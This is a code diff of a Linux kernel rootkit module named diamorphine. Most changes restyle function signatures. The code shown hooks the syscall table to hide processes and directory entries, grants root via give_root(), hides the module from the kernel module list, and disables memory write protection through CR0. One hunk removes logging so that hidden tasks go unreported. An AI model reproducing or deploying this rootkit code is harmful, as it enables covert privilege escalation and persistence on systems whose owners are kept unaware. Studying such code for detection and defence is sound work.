@@ -18,9 +18,7 @@ static t_syscall orig_getdents;
 static t_syscall orig_getdents64;
 static t_syscall orig_kill;
 
-unsigned long *
-get_syscall_table_bf(void)
-{
+unsigned long* get_syscall_table_bf(void) {
 	unsigned long *syscall_table;
 
 #ifdef KPROBE_LOOKUP
@@ -33,9 +31,7 @@ get_syscall_table_bf(void)
 	return syscall_table;
 }
 
-struct task_struct *
-find_task(pid_t pid)
-{
+struct task_struct* find_task(const pid_t pid) {
 	struct task_struct *p = current;
 	for_each_process(p) {
 		if (p->pid == pid)
@@ -44,9 +40,7 @@ find_task(pid_t pid)
 	return NULL;
 }
 
-int
-is_invisible(pid_t pid)
-{
+int is_invisible(const pid_t pid) {
 	if (!pid)
 		return 0;
 	const struct task_struct* task = find_task(pid);
@@ -58,7 +52,7 @@ is_invisible(pid_t pid)
 }
 
 static asmlinkage long hacked_getdents64(const struct pt_regs *pt_regs) {
-	int fd = (int) pt_regs->di;
+	int fd = pt_regs->di;
 	struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->si;
 	int ret = orig_getdents64(pt_regs), err;
 	unsigned short proc = 0;
@@ -108,7 +102,7 @@ out:
 }
 
 static asmlinkage long hacked_getdents(const struct pt_regs *pt_regs) {
-	int fd = (int) pt_regs->di;
+	int fd = pt_regs->di;
 	struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->si;
 	int ret = orig_getdents(pt_regs), err;
 	unsigned short proc = 0;
@@ -157,8 +151,7 @@ out:
 	return ret;
 }
 
-void
-give_root(void) {
+void give_root(void) {
 	struct cred* newcreds = prepare_creds();
 	if (newcreds == NULL)
 		return;
@@ -169,32 +162,25 @@ give_root(void) {
 	commit_creds(newcreds);
 }
 
-static inline void
-tidy(void)
-{
+static inline void tidy(void) {
 	kfree(THIS_MODULE->sect_attrs);
 	THIS_MODULE->sect_attrs = NULL;
 }
 
 static struct list_head *module_previous;
 static short module_hidden = 0;
-void
-module_show(void)
-{
+void module_show(void) {
 	list_add(&THIS_MODULE->list, module_previous);
 	module_hidden = 0;
 }
 
-void
-module_hide(void)
-{
+void module_hide(void) {
 	module_previous = THIS_MODULE->list.prev;
 	list_del(&THIS_MODULE->list);
 	module_hidden = 1;
 }
 
-asmlinkage int
-hacked_kill(const struct pt_regs* pt_regs) {
+asmlinkage int hacked_kill(const struct pt_regs* pt_regs) {
 	const pid_t pid = pt_regs->di;
 	const int sig = pt_regs->si;
 	struct task_struct *task;
@@ -218,18 +204,13 @@ hacked_kill(const struct pt_regs* pt_regs) {
 }
 
 KHOOK(account_process_tick);
-static void khook_account_process_tick(struct task_struct* task, int user) {
-	if (task->flags & PF_INVISIBLE) {
-		printk(KERN_INFO "Invisible task detected in account_process_tick! Task: %s (pid=%d)\n", task->comm, task->pid);
+static void khook_account_process_tick(struct task_struct* task, const int user) {
+	if (task->flags & PF_INVISIBLE)
 		return;
-	}
-	printk(KERN_INFO "Normal task detected in account_process_tick! Task: %s (pid=%d)\n", task->comm, task->pid);
 	return KHOOK_ORIGIN(account_process_tick, task, user);
 }
 
-static inline void
-write_cr0_forced(unsigned long val)
-{
+static inline void write_cr0_forced(unsigned long val) {
 	unsigned long __force_order;
 
 	asm volatile(
@@ -237,21 +218,15 @@ write_cr0_forced(unsigned long val)
 		: "+r"(val), "+m"(__force_order));
 }
 
-static inline void
-protect_memory(void)
-{
+static inline void protect_memory(void) {
 	write_cr0_forced(cr0);
 }
 
-static inline void
-unprotect_memory(void)
-{
+static inline void unprotect_memory(void) {
 	write_cr0_forced(cr0 & ~0x00010000);
 }
 
-static int __init
-diamorphine_init(void)
-{
+static int __init diamorphine_init(void) {
 	__sys_call_table = get_syscall_table_bf();
 	if (!__sys_call_table)
 		return -1;
@@ -277,9 +252,7 @@ diamorphine_init(void)
 	return 0;
 }
 
-static void __exit
-diamorphine_cleanup(void)
-{
+static void __exit diamorphine_cleanup(void) {
 	unprotect_memory();
 
 	__sys_call_table[__NR_getdents] = (unsigned long) orig_getdents;
